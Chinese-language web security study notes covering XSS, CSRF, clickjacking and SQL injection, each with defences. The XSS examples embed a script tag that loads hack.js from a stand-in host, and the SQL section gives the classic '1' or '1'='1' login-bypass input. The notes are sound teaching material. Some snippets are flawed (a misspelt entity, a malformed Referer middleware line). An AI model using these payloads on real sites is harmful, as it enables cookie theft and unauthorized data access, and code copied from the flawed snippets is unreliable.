# 网络安全
## 一、常见 web 攻击及其防御手段
1. XSS (Cross Site Scripting) 跨站脚本攻击
    - 1.1 定义：向存在安全漏洞的网站运行非法的非本站点的HTML标签或Javascript
    - 1.2 危害
        - 利用虚假输入表单骗取用户个人信息
        - 利用脚本窃取用户 cookie
    - 1.3 攻击方式
        - 反射型：url 参数直接注入
            - 分析：比如，将用户的浏览器url地址变成： `http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"></script>`，有时，为了让后面的网址没有那么可疑，攻击者会进行短域名伪造 <https://dwz.cn/>
        - 存储性：存储到 DB 后读取时注入
            - 分析: 比如，攻击者在某个表单输入 `我来了<script src="http://localhost:4000/hack.js"></script>`
    - 1.4 防御手段
        - 1.4.1 ejs转义
            - 前端方面
                - 一些模板引擎框架自带 ejs 转义
                - 浏览器默认开启 ejs 转义
            - 后端方面: 用户的输入永远不可信任的，最普遍的做法就是转义输入输出的内容，对于引号、尖括号、斜杠进行转义
                - 黑名单: 转义所有字符
                ```javascript
                function escape(str) { 
                    str = str.replace(/&/g, '&amp;') 
                    str = str.replace(/</g, '&lt;') 
                    str = str.replace(/>/g, '&gt;') 
                    str = str.replace(/"/g, '&quto;') 
                    str = str.replace(/'/g, '&#39;') 
                    str = str.replace(/`/g, '&#96;') 
                    str = str.replace(/\//g, '&#x2F;') 
                    return str 
                }
                ```
                - 白名单：有需要的格式不进行转义
                ```javascript
                const xss = require('xss')
                let html = xss('<h1 id="title">XSS Demo</h1><script>alert("xss");</script>')
                console.log(html)
                // <h1>XSS Demo</h1>&lt;script&gt;alert("xss");&lt;/script&gt;
                ```
        - 1.4.2 CSP(Content Security Policy) 内容安全策略
            - 定义：CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执
            - 方法
            ```javascript
            ctx.set('Content-Security-Policy', "default-src 'self'")
            // 只允许加载本站资源
            Content-Security-Policy: default-src 'self'
            // 只允许加载 HTTPS 协议图片
            Content-Security-Policy: img-src https://*
            // 不允许加载任何来源框架
            Content-Security-Policy: child-src 'none'
            ```
        - 1.4.3 HttpOnly Cookie
2. CSRF(Corss Site Request Forgery) 跨站请求伪造
    - 2.1 定义：攻击者利用用户已登陆的身份，在用户不知情的情况下，以用户的名义完成非法操作
    - 2.2 危害
        - 利用用户登录态，用户不知情
        - 冒充用户发帖
        - 完成业务请求（比如盗取用户资金）
    - 2.3 攻击方式
        - 比如在用户已登陆的网页并没有退出的情况下，诱导用户点击某个链接，然后在该网页嵌入一个`<iframe>`，`<iframe>`里面写着一些伪造请求的逻辑
    - 2.4 防御手段（以下四种都是在后台实现）
        - 2.4.1 Referer Check：后台通过 Referer Check检查请求的来源网址，如果不是用户的网址，则拒绝。（但是：Https不发送referer）
        ```javascript
        app.use(async (ctx, next) => { 
            await next() const referer = ctx.request.header.referer 
            console.log('Referer:', referer) 
        })
        ```
        - 2.4.2 验证码
        - 2.4.3 cookie值进行hash: 攻击者在访问信任网站A时，虽然浏览器可以在请求中带上 cookie ,但是网站A确不仅仅通过cookie来判断用户身份，同时通过用户发送过来的内容中的伪随机数来判断请求真正是用户发送的。攻击者在请求A的时候，不能在提交的内容中产生伪随机数
        - 2.4.4 禁止第三方携带cookie
3. click jacking 点击劫持
    - 3.1 定义：点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式嵌入自己的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击。即攻击者不盗取用户任何信息，只是诱导用户完成某个操作（比如点赞）
    - 3.2 防御手段
        - 前端方面
        ```html
        <head> 
            <style id="click-jack"> 
            html { display: none !important; } 
        </style> 
        </head> 
        <body> 
            <script>
            // self是当前窗口自身的引用，与window属性等价
            // top 返回顶层窗口，即浏览器窗口
            if (self == top) { 
                 var style = document.getElementById('click-jack') 
                 document.body.removeChild(style) 
            } else { 
                top.location = self.location 
            } 
            // 以上代码的作用就是当通过 iframe 的方式加载页面时，攻击者的网页直接不显示所有内容了。
            </script> 
        </body>
        ```
        - 后端方面 X-FRAME-OPTIONS
            - X-FRAME-OPTIONS 是一个 HTTP 响应头，在现代浏览器有一个很好的支持。这个 HTTP 响应头 就是为了防御用 iframe 嵌套的点击劫持攻击。
        ```javascript
        // DENY，表示页面不允许通过 iframe 的方式展示
        // SAMEORIGIN，表示页面可以在相同域名下通过 iframe 的方式展示
        // ALLOW-FROM，表示页面可以在指定来源的 iframe 中展示
        ctx.set('X-FRAME-OPTIONS', 'DENY')
        ```
4. SQL注入
    - 4.1 攻击方式
    ```javascript
    // 填入特殊密码 
    '1' or '1'='1'
    // 拼接后的SQL 
    SELECT * FROM test.user 
    WHERE username = 'laowang' 
    AND password = '1' or '1'='1'
    ```
    - 4.2 防御手段
        - 4.2.1 所有的查询语句建议使用数据库提供的**参数化查询接口**
## 二、防御手段
